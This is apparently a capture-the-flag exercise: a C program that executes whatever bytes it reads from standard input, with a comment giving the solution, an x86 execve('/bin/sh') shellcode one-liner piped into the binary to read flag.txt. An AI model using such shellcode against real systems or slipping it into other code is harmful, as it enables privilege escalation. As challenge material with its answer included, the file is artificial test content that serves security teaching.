/*
** Solution
** perl -e 'print "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x45\x45\x45\x45"' > /tmp/my_shellcode
** cat /tmp/my_shellcode /dev/stdin|./execute
** cat flag.txt
*/

#include <stdio.h>
#include <stdlib.h>

int token = 0;

typedef void (*function_ptr)();

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char **argv){
    char buf[128];

    be_nice_to_people();

    read(0, buf, 128);

    ((function_ptr)buf)();
}
